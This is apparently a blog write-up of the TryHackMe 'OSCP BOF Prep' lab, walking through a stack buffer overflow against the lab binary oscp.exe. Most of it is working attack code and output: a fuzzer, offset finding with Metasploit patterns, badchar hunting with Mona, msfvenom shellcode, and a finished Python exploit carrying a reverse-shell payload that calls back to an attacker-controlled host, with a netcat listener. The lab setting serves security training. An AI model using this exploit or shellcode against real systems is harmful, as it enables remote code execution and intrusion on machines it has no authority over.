---
layout: post
title: "BOF"
tags: TryHackMe
description: "Develop an exploit for a custom binary that vulnerable to the Stack Buffer Overflow vulnerability."
---

## Introduction

What is a `Buffer Overflow`?  
> In information security and programming, a buffer overflow, or buffer overrun, is an anomaly where a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations.  

At some point of doing this attack, you could take control over `EIP` and upload your shellcode into the memory to spawn a shell.  
BOF challenge is rated as 25 points in the `OSCP` exam. It might look complicated at first, but if you learned how to do it once, you will be able to do it again on the exam. In some way, it's the easiest part of the OSCP exam if you prepared properly.
For the sake of this demo, I would use the room [OSCP BOF Prep](https://tryhackme.com/room/bufferoverflowprep) on TryHackMe made by [Tib3rius](https://twitter.com/tibsec).

This room is good because of several reasons:
- You have a chance to poke the custom `oscp.exe` which has 10 different vulnerable to BOF inputs with different badchars and `EIP` offsets.
- You have all the needed tools preinstalled there.
- You have a variety of other "classic" vulnerable binaries there, including `SLMail`, `brainpan`, and `dostackbufferoverflowgood`.
- You can spin this machine on TryHackMe's environment for free.

 This is quite a basic example of the exploitation process against the binary vulnerable to the BOF, but it doesn't mean that it's easy to understand from a first look. As it's a basic BOF, you will don't find `ASLR`, `DEP`, and `Stack Canaries` on those binaries.

> This room uses a 32-bit Windows 7 VM with Immunity Debugger and Putty preinstalled. Windows Firewall and Defender have both been disabled to make exploit writing easier.  

You can deploy the machine [here](https://tryhackme.com/room/bufferoverflowprep) and connect to it via RDP:  
```
xfreerdp /u:admin /p:password /cert:ignore /v:<target_ip>
```

You can find the `Immunity Debugger` on the desktop. Run it `As Administrator` and attach the `oscp.exe` from `C:\Users\admin\Desktop\vulnerable-apps\oscp` folder.

Notice that the binary will be started, but `Paused` by the debugger (right bottom corner of the screenshot).  
To start it you can press `F9` or click the red `Play` button in the GUI.

Now you can connect to the machine IP via `nc` on port `1337`:

```
nc <target_ip> 1337
Welcome to OSCP Vulnerable Server! Enter HELP for help.
HELP
Valid Commands:
HELP
OVERFLOW1 [value]
OVERFLOW2 [value]
OVERFLOW3 [value]
OVERFLOW4 [value]
OVERFLOW5 [value]
OVERFLOW6 [value]
OVERFLOW7 [value]
OVERFLOW8 [value]
OVERFLOW9 [value]
OVERFLOW10 [value]
EXIT

OVERFLOW1 test
OVERFLOW1 COMPLETE
```
In this box you could also find a [Mona](https://github.com/corelan/mona) plugin installed, it will make the process of debugging easier.  
`Mona` needs to be configured to save files to a folder. You can type the following command to the left bottom corner of the `Immunity Debugger` window:
```
!mona config -set workingfolder c:\mona\%p
```

---

## Fuzzing
I used the following `Python` script to crash the application:
```
import socket, time, sys

ip = "<target_ip>"
port = 1337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

Let's run this script and cause the crash of the application:
```
python fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing with 1700 bytes
Fuzzing with 1800 bytes
Fuzzing with 1900 bytes
Fuzzing with 2000 bytes
Could not connect to <target_ip>:1337
```
> After each crash we will need to recover the initial state of the application. You can do so by the combination of the Ctrl+F2 and F9 buttons (Rewind back and Play buttons in GUI).

---

## Finding the offset and controlling EIP

According to the fuzzer, the application crashed somewhere after 2000 bytes being sent.  
To find it out for sure we will use `pattern_create.rb` script from `Metasploit`:  
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400

Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9
```
Note that `2400` here stands for the length of the string that we are creating. As we don't know for sure, we will add an extra `400` to the number of bytes that the application successfully received.

Create a new `exploit.py` with the following script:
```
import socket

ip = "<target_ip>"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
```

Update the `payload` variable with that pattern string that we just created and run the script:

```
python exploit.py
Sending evil buffer...
Done!
```
The application will crash again.   

Let's navigate to the `Immunity` and ask `Mona` for the status:
```
!mona findmsp -distance 2400
```
`-distance` here is the same as the length of the pattern was.  

We are interested in the string:
```
EIP contains normal pattern : ... (offset 1978)
```

You can also copy the value of the `EIP` after crash and use another `Metasploit` script to find the offset:
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_value>
```

Now we know the offset of the `EIP`. Halfway there!   
Update the `offset` variable in the script to this value (was previously set to 0).  
We don't need this pattern as the value of the `payload` variable anymore, so we can remove it.  
To make sure that we can control the `EIP` now, let's also update the variable `retn` with the value `BBBB`.  
The script at this moment should look like this:
```
import socket

ip = "<target_ip>"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```
Run the script and check that the value of the `EIP` is now equal to the `42424242` (ASCII for `BBBB`'s).

---

## Hunting for Bad Characters

Bad characters are bad. In most cases, this and offsets are the only things that will be different from BOF to BOF.  
There are two common ways to find badchars:
* Manual
* with using `Mona`

I strongly recommend starting with `mona`, as this option is less time-consuming.  

The following `mona` command will generate the `bytearray`:
```
!mona bytearray -b "\x00"
```
We will need it after a crash in a second. `-b` flag here is stands for a badchars, and so far we are not including only the `null byte` as it almost always a badchar.

Let's create a list of bad characters (from `\x01` to `\xff`), it can be done by running the following script:

```
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
```

The output of this script is:
```
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

Update the value of the variable `payload` with it and run the script.
Run the script and navigate to the `Immunity` one more time.   
`Mona` can compare created `bytearray` with the current state of the dump. That can be done by running that command:
```
!mona compare -f C:\mona\oscp\bytearray.bin -a 01AAFA30
```
The `-a` flag here stands for the address of the `ESP`. In that case, it should be `01AAFA30`.  

>  Sometimes badchars cause the next byte to get corrupted as well, so let's exclude each first byte from each pair.

Create a new `bytearray` without suspected badchars:

```
!mona bytearray -b "\x00\x07\x2e\xa0"
```

Manually remove the mentioned characters from the payload and run the script one more time.
Restart `oscp.exe` in `Immunity` and run the modified `exploit.py` script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.

## Finding a Jump Point
As now we are controlling the `EIP` and know the badchars, we can find the Jump Point.   
The goal of that action is to find the equivalent of the `JMP ESP` command in the memory that that will not have any of those badchars, otherwise, the shellcode will break.  
We can once again use `Mona` for that:
```
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
```
The `-cbp` flag here stands for all the badchars that we discovered.
`Mona` should return the result:
```
Result:
0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0
```
Note that all security mechanisms in this binary, such as `ASLR` and `SEH`, are disabled.  
Since the system is little endian, we need to write this address backward as the value of the `retn` variable:
```
0x625011af should be written as \xAF\x11\x50\x62
```

---

## Pop a calc
Everything is ready to spawn the `calc.exe`!  
To do that we will need to generate a shellcode with `msfvenom`:
```
msfvenom -p windows/exec -b "\x00\x07\x2e\xa0" -f python CMD=calc.exe EXITFUNC=thread
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of python file: 1078 bytes
buf =  b""
buf += b"\xba\xff\x2d\xe9\xfe\xdd\xc0\xd9\x74\x24\xf4\x5e\x2b"
buf += b"\xc9\xb1\x31\x31\x56\x13\x83\xc6\x04\x03\x56\xf0\xcf"
buf += b"\x1c\x02\xe6\x92\xdf\xfb\xf6\xf2\x56\x1e\xc7\x32\x0c"
buf += b"\x6a\x77\x83\x46\x3e\x7b\x68\x0a\xab\x08\x1c\x83\xdc"
buf += b"\xb9\xab\xf5\xd3\x3a\x87\xc6\x72\xb8\xda\x1a\x55\x81"
buf += b"\x14\x6f\x94\xc6\x49\x82\xc4\x9f\x06\x31\xf9\x94\x53"
buf += b"\x8a\x72\xe6\x72\x8a\x67\xbe\x75\xbb\x39\xb5\x2f\x1b"
buf += b"\xbb\x1a\x44\x12\xa3\x7f\x61\xec\x58\x4b\x1d\xef\x88"
buf += b"\x82\xde\x5c\xf5\x2b\x2d\x9c\x31\x8b\xce\xeb\x4b\xe8"
buf += b"\x73\xec\x8f\x93\xaf\x79\x14\x33\x3b\xd9\xf0\xc2\xe8"
buf += b"\xbc\x73\xc8\x45\xca\xdc\xcc\x58\x1f\x57\xe8\xd1\x9e"
buf += b"\xb8\x79\xa1\x84\x1c\x22\x71\xa4\x05\x8e\xd4\xd9\x56"
buf += b"\x71\x88\x7f\x1c\x9f\xdd\x0d\x7f\xf5\x20\x83\x05\xbb"
buf += b"\x23\x9b\x05\xeb\x4b\xaa\x8e\x64\x0b\x33\x45\xc1\xf3"
buf += b"\xd1\x4c\x3f\x9c\x4f\x05\x82\xc1\x6f\xf3\xc0\xff\xf3"
buf += b"\xf6\xb8\xfb\xec\x72\xbd\x40\xab\x6f\xcf\xd9\x5e\x90"
buf += b"\x7c\xd9\x4a\xf3\xe3\x49\x16\xda\x86\xe9\xbd\x22"
```
Update your script and replace `buf` with `payload`.  
As `msfvenom` is using an encoder to create a shellcode, we need to allocate some memory right before the payload to let it decode itself.  
For that, we will create a `NOP sled` 16 bytes long. `\x90` stands for `No Operation`, let's update the value of the `padding` variable:
```
padding = "\x90" * 16
```
Run the exploit and spawn your `calc.exe`!

---

## Spawning a shell
As now we know that the exploit is working fine and we can execute arbitrary code on the victim machine, let's create a shell with another `msfvenom` command:
```
msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1712 bytes
buf =  b""
buf += b"\xd9\xc8\xb8\xa4\x1f\x95\x09\xd9\x74\x24\xf4\x5e\x31"
buf += b"\xc9\xb1\x52\x31\x46\x17\x03\x46\x17\x83\x62\x1b\x77"
buf += b"\xfc\x96\xcc\xf5\xff\x66\x0d\x9a\x76\x83\x3c\x9a\xed"
buf += b"\xc0\x6f\x2a\x65\x84\x83\xc1\x2b\x3c\x17\xa7\xe3\x33"
buf += b"\x90\x02\xd2\x7a\x21\x3e\x26\x1d\xa1\x3d\x7b\xfd\x98"
buf += b"\x8d\x8e\xfc\xdd\xf0\x63\xac\xb6\x7f\xd1\x40\xb2\xca"
buf += b"\xea\xeb\x88\xdb\x6a\x08\x58\xdd\x5b\x9f\xd2\x84\x7b"
buf += b"\x1e\x36\xbd\x35\x38\x5b\xf8\x8c\xb3\xaf\x76\x0f\x15"
buf += b"\xfe\x77\xbc\x58\xce\x85\xbc\x9d\xe9\x75\xcb\xd7\x09"
buf += b"\x0b\xcc\x2c\x73\xd7\x59\xb6\xd3\x9c\xfa\x12\xe5\x71"
buf += b"\x9c\xd1\xe9\x3e\xea\xbd\xed\xc1\x3f\xb6\x0a\x49\xbe"
buf += b"\x18\x9b\x09\xe5\xbc\xc7\xca\x84\xe5\xad\xbd\xb9\xf5"
buf += b"\x0d\x61\x1c\x7e\xa3\x76\x2d\xdd\xac\xbb\x1c\xdd\x2c"
buf += b"\xd4\x17\xae\x1e\x7b\x8c\x38\x13\xf4\x0a\xbf\x54\x2f"
buf += b"\xea\x2f\xab\xd0\x0b\x66\x68\x84\x5b\x10\x59\xa5\x37"
buf += b"\xe0\x66\x70\x97\xb0\xc8\x2b\x58\x60\xa9\x9b\x30\x6a"
buf += b"\x26\xc3\x21\x95\xec\x6c\xcb\x6c\x67\x99\x06\x15\xc6"
buf += b"\xf5\x14\xe9\x39\x5a\x90\x0f\x53\x72\xf4\x98\xcc\xeb"
buf += b"\x5d\x52\x6c\xf3\x4b\x1f\xae\x7f\x78\xe0\x61\x88\xf5"
buf += b"\xf2\x16\x78\x40\xa8\xb1\x87\x7e\xc4\x5e\x15\xe5\x14"
buf += b"\x28\x06\xb2\x43\x7d\xf8\xcb\x01\x93\xa3\x65\x37\x6e"
buf += b"\x35\x4d\xf3\xb5\x86\x50\xfa\x38\xb2\x76\xec\x84\x3b"
buf += b"\x33\x58\x59\x6a\xed\x36\x1f\xc4\x5f\xe0\xc9\xbb\x09"
buf += b"\x64\x8f\xf7\x89\xf2\x90\xdd\x7f\x1a\x20\x88\x39\x25"
buf += b"\x8d\x5c\xce\x5e\xf3\xfc\x31\xb5\xb7\x1d\xd0\x1f\xc2"
buf += b"\xb5\x4d\xca\x6f\xd8\x6d\x21\xb3\xe5\xed\xc3\x4c\x12"
buf += b"\xed\xa6\x49\x5e\xa9\x5b\x20\xcf\x5c\x5b\x97\xf0\x74"
```
Put this shellcode as the value of the `payload` variable and run the exploit.  
Don't forget to start a `nc` listener to catch the shell:
```
sudo nc -nlvp 4444
```

---

## Final code of the exploit
In the end, your exploit code should look like that:
```
import socket

ip = "<target_ip"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 16
payload =  b""
payload += b"\xd9\xc8\xb8\xa4\x1f\x95\x09\xd9\x74\x24\xf4\x5e\x31"
payload += b"\xc9\xb1\x52\x31\x46\x17\x03\x46\x17\x83\x62\x1b\x77"
payload += b"\xfc\x96\xcc\xf5\xff\x66\x0d\x9a\x76\x83\x3c\x9a\xed"
payload += b"\xc0\x6f\x2a\x65\x84\x83\xc1\x2b\x3c\x17\xa7\xe3\x33"
payload += b"\x90\x02\xd2\x7a\x21\x3e\x26\x1d\xa1\x3d\x7b\xfd\x98"
payload += b"\x8d\x8e\xfc\xdd\xf0\x63\xac\xb6\x7f\xd1\x40\xb2\xca"
payload += b"\xea\xeb\x88\xdb\x6a\x08\x58\xdd\x5b\x9f\xd2\x84\x7b"
payload += b"\x1e\x36\xbd\x35\x38\x5b\xf8\x8c\xb3\xaf\x76\x0f\x15"
payload += b"\xfe\x77\xbc\x58\xce\x85\xbc\x9d\xe9\x75\xcb\xd7\x09"
payload += b"\x0b\xcc\x2c\x73\xd7\x59\xb6\xd3\x9c\xfa\x12\xe5\x71"
payload += b"\x9c\xd1\xe9\x3e\xea\xbd\xed\xc1\x3f\xb6\x0a\x49\xbe"
payload += b"\x18\x9b\x09\xe5\xbc\xc7\xca\x84\xe5\xad\xbd\xb9\xf5"
payload += b"\x0d\x61\x1c\x7e\xa3\x76\x2d\xdd\xac\xbb\x1c\xdd\x2c"
payload += b"\xd4\x17\xae\x1e\x7b\x8c\x38\x13\xf4\x0a\xbf\x54\x2f"
payload += b"\xea\x2f\xab\xd0\x0b\x66\x68\x84\x5b\x10\x59\xa5\x37"
payload += b"\xe0\x66\x70\x97\xb0\xc8\x2b\x58\x60\xa9\x9b\x30\x6a"
payload += b"\x26\xc3\x21\x95\xec\x6c\xcb\x6c\x67\x99\x06\x15\xc6"
payload += b"\xf5\x14\xe9\x39\x5a\x90\x0f\x53\x72\xf4\x98\xcc\xeb"
payload += b"\x5d\x52\x6c\xf3\x4b\x1f\xae\x7f\x78\xe0\x61\x88\xf5"
payload += b"\xf2\x16\x78\x40\xa8\xb1\x87\x7e\xc4\x5e\x15\xe5\x14"
payload += b"\x28\x06\xb2\x43\x7d\xf8\xcb\x01\x93\xa3\x65\x37\x6e"
payload += b"\x35\x4d\xf3\xb5\x86\x50\xfa\x38\xb2\x76\xec\x84\x3b"
payload += b"\x33\x58\x59\x6a\xed\x36\x1f\xc4\x5f\xe0\xc9\xbb\x09"
payload += b"\x64\x8f\xf7\x89\xf2\x90\xdd\x7f\x1a\x20\x88\x39\x25"
payload += b"\x8d\x5c\xce\x5e\xf3\xfc\x31\xb5\xb7\x1d\xd0\x1f\xc2"
payload += b"\xb5\x4d\xca\x6f\xd8\x6d\x21\xb3\xe5\xed\xc3\x4c\x12"
payload += b"\xed\xa6\x49\x5e\xa9\x5b\x20\xcf\x5c\x5b\x97\xf0\x74"
postfix = ""

payloadfer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil payloadfer...")
    s.send(payloadfer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```
